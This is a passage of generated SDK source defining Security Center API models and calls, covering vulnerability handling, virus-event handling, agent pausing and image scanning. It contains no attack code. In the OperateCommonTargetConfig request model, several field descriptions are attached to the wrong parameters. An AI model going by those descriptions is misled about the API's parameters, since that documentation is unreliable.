  var runtime = new Util.RuntimeOptions{};
  return operateAgentClientInstallWithOptions(request, runtime);
}

model OperateCommonOverallConfigRequest {
  config?: string(name='Config', example='on'),
  sourceIp?: string(name='SourceIp', example='223.79.XX.XX'),
  type?: string(name='Type', example='kdump_switch'),
}

model OperateCommonOverallConfigResponseBody = {
  requestId?: string(name='RequestId', example='7E0618A9-D5EF-4220-9471-C42B5E92719F'),
}

model OperateCommonOverallConfigResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: OperateCommonOverallConfigResponseBody(name='body'),
}

async function operateCommonOverallConfigWithOptions(request: OperateCommonOverallConfigRequest, runtime: Util.RuntimeOptions): OperateCommonOverallConfigResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.config)) {
    query['Config'] = request.config;
  }
  if (!Util.isUnset(request.sourceIp)) {
    query['SourceIp'] = request.sourceIp;
  }
  if (!Util.isUnset(request.type)) {
    query['Type'] = request.type;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'OperateCommonOverallConfig',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function operateCommonOverallConfig(request: OperateCommonOverallConfigRequest): OperateCommonOverallConfigResponse {
  var runtime = new Util.RuntimeOptions{};
  return operateCommonOverallConfigWithOptions(request, runtime);
}

model OperateCommonTargetConfigRequest {
  fieldName?: string(name='FieldName', description='The name of the image repository or the namespace of the image repository.', example='repoName'),
  fieldValue?: string(name='FieldValue', description='The data returned.', example='cafcmc-dev'),
  sourceIp?: string(name='SourceIp', description='The type of the feature. Valid values:

*   **alidetect-scan-enable**: local file detection
*   **ACTION-TRIAL-PERMISSION**: data delivery of ActionTrail
*   **alidetect**: local file detection engine
*   **container\\_prevent\\_escape**: container escape prevention
*   **image\\_repo**: repository image scan
*   **proc\\_filter\\_switch**: log filtering
*   **agentless**: agentless detection
*   **rasp**: application protection
*   **sensitiveFile**: sensitive file detection
*   **aliscriptengine**: in-depth detection engine
*   **containerNetwork**: container network visualization', example='182.92.XXX.XXX'),
  targetOperations?: string(name='TargetOperations', description='The type of the image. Valid values:

*   **repoName**: the name of the image repository
*   **repoNamespace**: the namespace of the image repository', example='[
      {
            "targetType": "uuid",
            "target": "f329a044-6a2f-49a0-9d33-352f6c1d****",
            "flag": "del"
      }
]'),
  targetType?: string(name='TargetType', description='The configuration of proactive defense for your server. The value includes the following fields:

*   **targetType**: specifies the dimension from which you manage proactive defense. UUIDs are supported. Set the value to **uuid**.
*   **target**: specifies the UUID of the server for which you want to configure proactive defense.
*   **flag**: specifies whether to enable or disable proactive defense for your server. Valid values are **add** and **del**. The value add indicates that proactive defense will be enabled for your server. The value del indicates that proactive defense will be disabled for your server.', example='uuid'),
  type?: string(name='Type', description='The dimension based on which you want to configure the feature. Valid values:

*   **uuid**: the UUID of the server
*   **Cluster**: the ID of the cluster
*   **image_repo**: the name of the image repository', example='alidetect'),
}

model OperateCommonTargetConfigResponseBody = {
  requestId?: string(name='RequestId', example='95D45C44-4F53-5ED2-8E12-7D134564B****'),
}

model OperateCommonTargetConfigResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: OperateCommonTargetConfigResponseBody(name='body'),
}

async function operateCommonTargetConfigWithOptions(request: OperateCommonTargetConfigRequest, runtime: Util.RuntimeOptions): OperateCommonTargetConfigResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.fieldName)) {
    query['FieldName'] = request.fieldName;
  }
  if (!Util.isUnset(request.fieldValue)) {
    query['FieldValue'] = request.fieldValue;
  }
  if (!Util.isUnset(request.sourceIp)) {
    query['SourceIp'] = request.sourceIp;
  }
  if (!Util.isUnset(request.targetOperations)) {
    query['TargetOperations'] = request.targetOperations;
  }
  if (!Util.isUnset(request.targetType)) {
    query['TargetType'] = request.targetType;
  }
  if (!Util.isUnset(request.type)) {
    query['Type'] = request.type;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'OperateCommonTargetConfig',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function operateCommonTargetConfig(request: OperateCommonTargetConfigRequest): OperateCommonTargetConfigResponse {
  var runtime = new Util.RuntimeOptions{};
  return operateCommonTargetConfigWithOptions(request, runtime);
}

model OperateImageBaselineWhitelistRequest {
  baselineItemKeyList?: string(name='BaselineItemKeyList', example='hc.image.checklist.identify.hc_exploit_es_linux.item'),
  imageUuid?: string(name='ImageUuid', example='a5250ebca765dc9eb1a84b790b0e****'),
  lang?: string(name='Lang', example='zh'),
  operation?: string(name='Operation', example='add'),
  scanRange?: [ string ](name='ScanRange'),
}

model OperateImageBaselineWhitelistResponseBody = {
  requestId?: string(name='RequestId', example='75AD186B-B46A-56CC-BE35-987ADDF6****'),
}

model OperateImageBaselineWhitelistResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: OperateImageBaselineWhitelistResponseBody(name='body'),
}

async function operateImageBaselineWhitelistWithOptions(request: OperateImageBaselineWhitelistRequest, runtime: Util.RuntimeOptions): OperateImageBaselineWhitelistResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.baselineItemKeyList)) {
    query['BaselineItemKeyList'] = request.baselineItemKeyList;
  }
  if (!Util.isUnset(request.imageUuid)) {
    query['ImageUuid'] = request.imageUuid;
  }
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.operation)) {
    query['Operation'] = request.operation;
  }
  if (!Util.isUnset(request.scanRange)) {
    query['ScanRange'] = request.scanRange;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'OperateImageBaselineWhitelist',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function operateImageBaselineWhitelist(request: OperateImageBaselineWhitelistRequest): OperateImageBaselineWhitelistResponse {
  var runtime = new Util.RuntimeOptions{};
  return operateImageBaselineWhitelistWithOptions(request, runtime);
}

model OperateImageVulRequest {
  info?: string(name='Info', example='[{\\"namespace\\":\\"cloud_oa****\\",\\"repoName\\":\\"hybirdc****\\",\\"regionId\\":\\"cn-shanghai\\",\\"instanceId\\":\\"cri-rv4nvbv8iju4****\\",\\"repoId\\":\\"crr-2q7302qrofxg****\\",\\"tag\\":\\"hybird-cloud-web_fix_167115945****\\",\\"digest\\":\\"e1a4fd25884ca2ef8840bb252c9926e4f549df9e046500dd93539b2d458c****\\",\\"newTag\\":\\"hybird-cloud-web_fix_167115996****\\",\\"uuid\\":\\"4ad91dd8c0c02de6574fa98085d0****\\",\\"ids\\":[197540864,197540865,197540869]}]'),
  operateType?: string(name='OperateType', example='vul_fix'),
  type?: string(name='Type', example='cve'),
}

model OperateImageVulResponseBody = {
  requestId?: string(name='RequestId', example='486F2228-438A-544A-A533-433F943C15CD'),
}

model OperateImageVulResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: OperateImageVulResponseBody(name='body'),
}

async function operateImageVulWithOptions(request: OperateImageVulRequest, runtime: Util.RuntimeOptions): OperateImageVulResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.info)) {
    query['Info'] = request.info;
  }
  if (!Util.isUnset(request.operateType)) {
    query['OperateType'] = request.operateType;
  }
  if (!Util.isUnset(request.type)) {
    query['Type'] = request.type;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'OperateImageVul',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function operateImageVul(request: OperateImageVulRequest): OperateImageVulResponse {
  var runtime = new Util.RuntimeOptions{};
  return operateImageVulWithOptions(request, runtime);
}

model OperateSuspiciousOverallConfigRequest {
  config?: string(name='Config', example='off'),
  lang?: string(name='Lang', example='zh'),
  noTargetAsOn?: boolean(name='NoTargetAsOn', example='true'),
  sourceIp?: string(name='SourceIp', description='OperateSuspiciousOverallConfig', example='222.178.XX.XX'),
  type?: string(name='Type', example='k8s_log_analysis'),
}

model OperateSuspiciousOverallConfigResponseBody = {
  requestId?: string(name='RequestId', example='C286491D-4A2F-589A-B63B-D2AD3DA9BD71'),
}

model OperateSuspiciousOverallConfigResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: OperateSuspiciousOverallConfigResponseBody(name='body'),
}

async function operateSuspiciousOverallConfigWithOptions(request: OperateSuspiciousOverallConfigRequest, runtime: Util.RuntimeOptions): OperateSuspiciousOverallConfigResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.config)) {
    query['Config'] = request.config;
  }
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.noTargetAsOn)) {
    query['NoTargetAsOn'] = request.noTargetAsOn;
  }
  if (!Util.isUnset(request.sourceIp)) {
    query['SourceIp'] = request.sourceIp;
  }
  if (!Util.isUnset(request.type)) {
    query['Type'] = request.type;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'OperateSuspiciousOverallConfig',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function operateSuspiciousOverallConfig(request: OperateSuspiciousOverallConfigRequest): OperateSuspiciousOverallConfigResponse {
  var runtime = new Util.RuntimeOptions{};
  return operateSuspiciousOverallConfigWithOptions(request, runtime);
}

model OperateSuspiciousTargetConfigRequest {
  lang?: string(name='Lang', description='The language of the content within the request and response. Default value: **zh**. Valid values:

*   **zh**: Chinese
*   **en**: English', example='zh'),
  sourceIp?: string(name='SourceIp', description='The source IP address of the request.', example='1.2.XX.XX'),
  targetOperations?: string(name='TargetOperations', description='The configuration of proactive defense for your server. The value includes the following fields:

*   **targetType**: specifies the dimension from which you manage proactive defense. UUIDs are supported. Set the value to **uuid**.
*   **target**: specifies the UUID of the server for which you want to configure proactive defense.
*   **flag**: specifies whether to enable or disable proactive defense for your server. Valid values are **add** and **del**. The value add indicates that proactive defense will be enabled for your server. The value del indicates that proactive defense will be disabled for your server.', example='"[{"targetType":"uuid","target":"0585f81a-dd84-4ddf-9971-f59d12345678","flag":"add"},{"targetType":"uuid","target":"01acfd9d-e6a4-4e61-b9eb-aae012345678","flag":"add"},{"targetType":"uuid","target":"04a0e735-ad32-4835-b635-045812345678","flag":"add"}]"'),
  targetType?: string(name='TargetType', description='The dimension from which you manage proactive defense. Only the server UUID dimension is supported.

Set the value to **uuid**.', example='uuid'),
  type?: string(name='Type', description='The type of proactive defense. Valid Values:

*   **auto_breaking**: automatic blocking
*   **webshell_cloud_breaking**: webshell defense
*   **alinet**: malicious behavior defense
*   **ransomware_breaking**: ransomware capture
*   **alisecguard**: client protection', example='auto_breaking'),
}

model OperateSuspiciousTargetConfigResponseBody = {
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='ABCD-PSD2-5256-1DSA-4222-JHBN'),
}

model OperateSuspiciousTargetConfigResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: OperateSuspiciousTargetConfigResponseBody(name='body'),
}

async function operateSuspiciousTargetConfigWithOptions(request: OperateSuspiciousTargetConfigRequest, runtime: Util.RuntimeOptions): OperateSuspiciousTargetConfigResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.sourceIp)) {
    query['SourceIp'] = request.sourceIp;
  }
  if (!Util.isUnset(request.targetOperations)) {
    query['TargetOperations'] = request.targetOperations;
  }
  if (!Util.isUnset(request.targetType)) {
    query['TargetType'] = request.targetType;
  }
  if (!Util.isUnset(request.type)) {
    query['Type'] = request.type;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'OperateSuspiciousTargetConfig',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function operateSuspiciousTargetConfig(request: OperateSuspiciousTargetConfigRequest): OperateSuspiciousTargetConfigResponse {
  var runtime = new Util.RuntimeOptions{};
  return operateSuspiciousTargetConfigWithOptions(request, runtime);
}

model OperateVirusEventsRequest {
  operationAll?: int32(name='OperationAll', description='Specifies whether to handle all alert events. Valid values:

*   **1**: yes
*   **0**: no', example='0'),
  operationCode?: string(name='OperationCode', description='The operation that you want to perform on the alert events. Valid values:

*   **default**: performs in-depth detection and removal
*   **ignore**: ignores the alert event
*   **advance_mark_mis_info**: adds the alert events to the whitelist
*   **manual_handled**: marks the alert events as manually handled', example='default'),
  operationRange?: string(name='OperationRange', description='The handling scope.', example='[{\\"type\\":\\"machine\\",\\"list\\":[\\"xxxxxxxxx-4cbf-4ca6-a1b7-8a09d1f86ab0\\"]}]'),
}

model OperateVirusEventsResponseBody = {
  requestId?: string(name='RequestId', description='The ID of the request.', example='B72BEC03-001C-5C77-A4BB-1E6XXXXXXX'),
  taskId?: long(name='TaskId', description='The ID of the task to handle multiple alert events at a time.', example='1'),
}

model OperateVirusEventsResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: OperateVirusEventsResponseBody(name='body'),
}

async function operateVirusEventsWithOptions(request: OperateVirusEventsRequest, runtime: Util.RuntimeOptions): OperateVirusEventsResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.operationAll)) {
    query['OperationAll'] = request.operationAll;
  }
  if (!Util.isUnset(request.operationCode)) {
    query['OperationCode'] = request.operationCode;
  }
  if (!Util.isUnset(request.operationRange)) {
    query['OperationRange'] = request.operationRange;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'OperateVirusEvents',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function operateVirusEvents(request: OperateVirusEventsRequest): OperateVirusEventsResponse {
  var runtime = new Util.RuntimeOptions{};
  return operateVirusEventsWithOptions(request, runtime);
}

model OperateVulsRequest {
  operateType?: string(name='OperateType', example='vul_fix'),
  type?: string(name='Type', example='cve'),
  uuids?: [ string ](name='Uuids'),
  vulNames?: [ string ](name='VulNames'),
}

model OperateVulsResponseBody = {
  requestId?: string(name='RequestId', example='C2677612-7207-4AEB-BD48-8BA528F86777'),
}

model OperateVulsResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: OperateVulsResponseBody(name='body'),
}

async function operateVulsWithOptions(request: OperateVulsRequest, runtime: Util.RuntimeOptions): OperateVulsResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.operateType)) {
    query['OperateType'] = request.operateType;
  }
  if (!Util.isUnset(request.type)) {
    query['Type'] = request.type;
  }
  if (!Util.isUnset(request.uuids)) {
    query['Uuids'] = request.uuids;
  }
  if (!Util.isUnset(request.vulNames)) {
    query['VulNames'] = request.vulNames;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'OperateVuls',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function operateVuls(request: OperateVulsRequest): OperateVulsResponse {
  var runtime = new Util.RuntimeOptions{};
  return operateVulsWithOptions(request, runtime);
}

model OperateWebLockFileEventsRequest {
  dealAll?: int32(name='DealAll', example='1'),
  eventIds?: [ long ](name='EventIds'),
  operationCode?: string(name='OperationCode', example='whitelist'),
}

model OperateWebLockFileEventsResponseBody = {
  requestId?: string(name='RequestId', example='2884C186-E8C0-5611-8207-3FF15EE7D9B4'),
}

model OperateWebLockFileEventsResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: OperateWebLockFileEventsResponseBody(name='body'),
}

async function operateWebLockFileEventsWithOptions(request: OperateWebLockFileEventsRequest, runtime: Util.RuntimeOptions): OperateWebLockFileEventsResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.dealAll)) {
    query['DealAll'] = request.dealAll;
  }
  if (!Util.isUnset(request.eventIds)) {
    query['EventIds'] = request.eventIds;
  }
  if (!Util.isUnset(request.operationCode)) {
    query['OperationCode'] = request.operationCode;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'OperateWebLockFileEvents',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function operateWebLockFileEvents(request: OperateWebLockFileEventsRequest): OperateWebLockFileEventsResponse {
  var runtime = new Util.RuntimeOptions{};
  return operateWebLockFileEventsWithOptions(request, runtime);
}

model OperationCancelIgnoreSuspEventRequest {
  securityEventIds?: [ long ](name='SecurityEventIds', description='OperationCancelIgnoreSuspEvent'),
}

model OperationCancelIgnoreSuspEventResponseBody = {
  code?: string(name='Code', example='200'),
  httpStatusCode?: int32(name='HttpStatusCode', example='200'),
  message?: string(name='Message', example='successful'),
  requestId?: string(name='RequestId', example='CE500770-42D3-442E-9DDD-156E0F9F3B45'),
  success?: boolean(name='Success', example='true'),
  timeCost?: long(name='TimeCost', example='1'),
}

model OperationCancelIgnoreSuspEventResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: OperationCancelIgnoreSuspEventResponseBody(name='body'),
}

async function operationCancelIgnoreSuspEventWithOptions(request: OperationCancelIgnoreSuspEventRequest, runtime: Util.RuntimeOptions): OperationCancelIgnoreSuspEventResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.securityEventIds)) {
    query['SecurityEventIds'] = request.securityEventIds;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'OperationCancelIgnoreSuspEvent',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function operationCancelIgnoreSuspEvent(request: OperationCancelIgnoreSuspEventRequest): OperationCancelIgnoreSuspEventResponse {
  var runtime = new Util.RuntimeOptions{};
  return operationCancelIgnoreSuspEventWithOptions(request, runtime);
}

model OperationSuspEventsRequest {
  from?: string(name='From', example='sas'),
  operation?: string(name='Operation', description='WB01014029', example='deal'),
  sourceIp?: string(name='SourceIp', description='Handles multiple exceptions at a time.', example='1.2.XX.XX'),
  subOperation?: string(name='SubOperation', example='killAndQuaraFileByPidAndMd5andPath'),
  suspiciousEventIds?: string(name='SuspiciousEventIds', description='OperationSuspEvents', example='290852'),
  warnType?: string(name='WarnType', example='alarm'),
}

model OperationSuspEventsResponseBody = {
  accessCode?: string(name='AccessCode', example='pass'),
  requestId?: string(name='RequestId', example='7E0618A9-D5EF-4220-9471-C42B5E92719F'),
  success?: boolean(name='Success', example='true'),
}

model OperationSuspEventsResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: OperationSuspEventsResponseBody(name='body'),
}

async function operationSuspEventsWithOptions(request: OperationSuspEventsRequest, runtime: Util.RuntimeOptions): OperationSuspEventsResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.from)) {
    query['From'] = request.from;
  }
  if (!Util.isUnset(request.operation)) {
    query['Operation'] = request.operation;
  }
  if (!Util.isUnset(request.sourceIp)) {
    query['SourceIp'] = request.sourceIp;
  }
  if (!Util.isUnset(request.subOperation)) {
    query['SubOperation'] = request.subOperation;
  }
  if (!Util.isUnset(request.suspiciousEventIds)) {
    query['SuspiciousEventIds'] = request.suspiciousEventIds;
  }
  if (!Util.isUnset(request.warnType)) {
    query['WarnType'] = request.warnType;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'OperationSuspEvents',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function operationSuspEvents(request: OperationSuspEventsRequest): OperationSuspEventsResponse {
  var runtime = new Util.RuntimeOptions{};
  return operationSuspEventsWithOptions(request, runtime);
}

model PageImageRegistryRequest {
  currentPage?: int32(name='CurrentPage', example='1'),
  pageSize?: int32(name='PageSize', example='20'),
  registryNameLike?: string(name='RegistryNameLike', example='asa'),
  registryTypeInList?: [ string ](name='RegistryTypeInList'),
  registryTypeNotInList?: [ string ](name='RegistryTypeNotInList'),
  sourceIp?: string(name='SourceIp', example='140.207.XXX.XXX'),
}

model PageImageRegistryResponseBody = {
  list?: [ 
    {
      blackList?: string(name='BlackList', example='129.211.XXX.XXX'),
      domainName?: string(name='DomainName', example='sinochem.com'),
      gmtCreate?: string(name='GmtCreate', example='2022-08-30 10:23:30'),
      gmtModified?: string(name='GmtModified', example='2022-09-30 10:23:30'),
      id?: long(name='Id', example='1078312'),
      imageCount?: int32(name='ImageCount', example='1'),
      jenkinsEnv?: string(name='JenkinsEnv', example='projectInfo'),
      netType?: int32(name='NetType', example='1'),
      password?: string(name='Password', example='Harbor******'),
      persistenceDay?: int32(name='PersistenceDay', example='30'),
      protocolType?: int32(name='ProtocolType', example='1'),
      regionId?: string(name='RegionId', example='cn-hangzhou'),
      registryHostIp?: string(name='RegistryHostIp', example='39.104.XXX.XXX'),
      registryName?: string(name='RegistryName', example='test1'),
      registryType?: string(name='RegistryType', example='harbor'),
      token?: string(name='Token', example='c7b90d29-632f-4e58-88b8-00ad77f6****'),
      transPerHour?: int32(name='TransPerHour', example='30'),
      userName?: string(name='UserName', example='RegistryUser'),
      vpcId?: string(name='VpcId', example='vpc-5gu8iu68w9b472jbb****'),
      whiteList?: string(name='WhiteList', example='192.168.XXX.XXX'),
    }
  ](name='List'),
  pageInfo?: {
    count?: int32(name='Count', example='20'),
    currentPage?: int32(name='CurrentPage', example='1'),
    pageSize?: int32(name='PageSize', example='20'),
    totalCount?: int32(name='TotalCount', example='69'),
  }(name='PageInfo'),
  requestId?: string(name='RequestId', example='FDA9E37C-6114-5945-8FF1-E3D4D397****'),
}

model PageImageRegistryResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: PageImageRegistryResponseBody(name='body'),
}

async function pageImageRegistryWithOptions(request: PageImageRegistryRequest, runtime: Util.RuntimeOptions): PageImageRegistryResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.sourceIp)) {
    query['SourceIp'] = request.sourceIp;
  }
  var body : map[string]any = {};
  if (!Util.isUnset(request.currentPage)) {
    body['CurrentPage'] = request.currentPage;
  }
  if (!Util.isUnset(request.pageSize)) {
    body['PageSize'] = request.pageSize;
  }
  if (!Util.isUnset(request.registryNameLike)) {
    body['RegistryNameLike'] = request.registryNameLike;
  }
  if (!Util.isUnset(request.registryTypeInList)) {
    body['RegistryTypeInList'] = request.registryTypeInList;
  }
  if (!Util.isUnset(request.registryTypeNotInList)) {
    body['RegistryTypeNotInList'] = request.registryTypeNotInList;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
    body = OpenApiUtil.parseToMap(body),
  };
  var params = new OpenApi.Params{
    action = 'PageImageRegistry',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function pageImageRegistry(request: PageImageRegistryRequest): PageImageRegistryResponse {
  var runtime = new Util.RuntimeOptions{};
  return pageImageRegistryWithOptions(request, runtime);
}

model PauseClientRequest {
  uuids?: string(name='Uuids', description='The UUIDs of servers for which you want to enable or disable the Security Center agent.', example='uuid-1211-sadsd-2131'),
  value?: string(name='Value', description='The status of the Security Center agent. Valid values:

*   **0**: disabled
*   **1**: enabled', example='1'),
}

model PauseClientResponseBody = {
  requestId?: string(name='RequestId', description='The ID of the request.', example='6673D49C-A9AB-40DD-B4A2-B92306701AE7'),
}

model PauseClientResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: PauseClientResponseBody(name='body'),
}

async function pauseClientWithOptions(request: PauseClientRequest, runtime: Util.RuntimeOptions): PauseClientResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.uuids)) {
    query['Uuids'] = request.uuids;
  }
  if (!Util.isUnset(request.value)) {
    query['Value'] = request.value;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'PauseClient',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function pauseClient(request: PauseClientRequest): PauseClientResponse {
  var runtime = new Util.RuntimeOptions{};
  return pauseClientWithOptions(request, runtime);
}

model PublicCreateImageScanTaskRequest {
  digests?: string(name='Digests', example='6a5e103187b31a94592a47a5858617f7a6c'),
  instanceIds?: string(name='InstanceIds', example='i-uf6j8vq9l4r5ntht****'),
  regionIds?: string(name='RegionIds', example='cn-hangzhou'),
  registryTypes?: string(name='RegistryTypes', example='acr'),
  repoIds?: string(name='RepoIds', example='crr-vridcl4****'),
  repoNames?: string(name='RepoNames', example='centos'),
  repoNamespaces?: string(name='RepoNamespaces', example='hanghai-namespace'),
  sourceIp?: string(name='SourceIp', example='192.168..XX.XX'),
  tags?: string(name='Tags', example='0.2'),
}

model PublicCreateImageScanTaskResponseBody = {
  data?: {
    canCreate?: boolean(name='CanCreate', example='true'),
    collectTime?: long(name='CollectTime', example='1644286364150'),
    execTime?: long(name='ExecTime', example='1644286364150'),
    finishCount?: int32(name='FinishCount', example='5'),
    progress?: int32(name='Progress', example='100'),
    result?: string(name='Result', example='SUCCESS'),
    status?: string(name='Status', example='SUCCESS'),
    taskId?: string(name='TaskId', example='a410bb3e68c217a3368bc0238c66886d'),
    totalCount?: int32(name='TotalCount', example='5'),
  }(name='Data'),
  requestId?: string(name='RequestId', example='F9353221-40F4-5F98-B73C-2803DC804033'),
}

model PublicCreateImageScanTaskResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: PublicCreateImageScanTaskResponseBody(name='body'),
}

/**
  * The result of the image scan task. Valid values:
  * *   **SUCCESS**: The task is successful.
  * *   **TASK_NOT_SUPPORT_REGION**: The images are deployed in a region that is not supported by container image scan.
  * > For more information about the regions supported by container image scan, see the "Regions supported by container image scan" section in this topic.
  *
  * @param request PublicCreateImageScanTaskRequest
  * @param runtime runtime options for this request RuntimeOptions
  * @return PublicCreateImageScanTaskResponse
 */
async function publicCreateImageScanTaskWithOptions(request: PublicCreateImageScanTaskRequest, runtime: Util.RuntimeOptions): PublicCreateImageScanTaskResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.digests)) {
    query['Digests'] = request.digests;
  }
  if (!Util.isUnset(request.instanceIds)) {
    query['InstanceIds'] = request.instanceIds;
  }
  if (!Util.isUnset(request.regionIds)) {
    query['RegionIds'] = request.regionIds;
  }
  if (!Util.isUnset(request.registryTypes)) {
    query['RegistryTypes'] = request.registryTypes;
  }
  if (!Util.isUnset(request.repoIds)) {
    query['RepoIds'] = request.repoIds;
  }
  if (!Util.isUnset(request.repoNames)) {
    query['RepoNames'] = request.repoNames;
  }
  if (!Util.isUnset(request.repoNamespaces)) {
    query['RepoNamespaces'] = request.repoNamespaces;
  }
  if (!Util.isUnset(request.sourceIp)) {
    query['SourceIp'] = request.sourceIp;
  }
  if (!Util.isUnset(request.tags)) {
    query['Tags'] = request.tags;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'PublicCreateImageScanTask',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

/**
  * The result of the image scan task. Valid values:
  * *   **SUCCESS**: The task is successful.
